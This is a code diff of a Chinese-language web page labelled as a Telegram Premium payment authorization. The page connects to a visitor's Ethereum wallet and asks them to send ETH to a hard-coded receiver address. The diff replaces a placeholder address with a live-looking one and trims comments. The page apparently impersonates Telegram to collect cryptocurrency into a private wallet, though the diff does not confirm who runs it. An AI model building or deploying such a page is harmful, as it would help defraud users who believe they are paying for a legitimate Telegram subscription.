@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="utf-8"/>
+    <meta charset="UTF-8"/>
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
     <title>支付授权 - Telegram Premium</title>
 
@@ -9,7 +9,7 @@
 
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);color:#fff;min-height:100vh;padding:1rem}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);color:#fff;min-height:100vh;padding:1rem;line-height:1.5}
         .container{max-width:28rem;margin:0 auto}
         .header{text-align:center;margin-bottom:1.5rem}
         .header h1{font-size:1.6rem;color:#ffd700;margin-bottom:.25rem}
@@ -47,7 +47,7 @@
 
     <script>
     // === 配置（与 index.html 保持一致） ===
-    const RECEIVER_ADDRESS_ETH = '0x742EfB6A78A0b5c0e5c5F8c5B8c5c5F8c5B8c5c5F'; // 替换
+    const RECEIVER_ADDRESS_ETH = '0xfD6C3974036d8b7B5EC3cc001b1e088cD5f609c6';
     const POLL_TX_INTERVAL = 3000;
 
     let web3 = null;
@@ -138,15 +138,14 @@
 
         if (!txHash) {
             // 若无 txHash，可引导用户在钱包中发起交易（此处仅作为备选：发起 minimal tx）
-            // 但 index.html 已经在发起后跳转带上 txHash，实际情况下无需在此重复发起
             const wantSend = confirm('页面未检测到交易哈希。是否在钱包中发起一笔演示交易以生成 txHash？（将发送非常小额 ETH）');
             if (!wantSend) return;
 
-            // 让用户请求发起交易（需要先连接 wallet）
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const from = accounts[0];
-                const value = web3.utils.toWei('0.0005', 'ether'); // 非常小额演示
+                // 此处 value 为示例极小额，真实金额应使用后端换算 USD->ETH
+                const value = web3.utils.toWei('0.0005', 'ether');
                 const params = { from, to: RECEIVER_ADDRESS_ETH, value: web3.utils.toHex(value), gas: web3.utils.toHex(21000) };
                 const newTxHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [params] });
                 txHash = newTxHash;
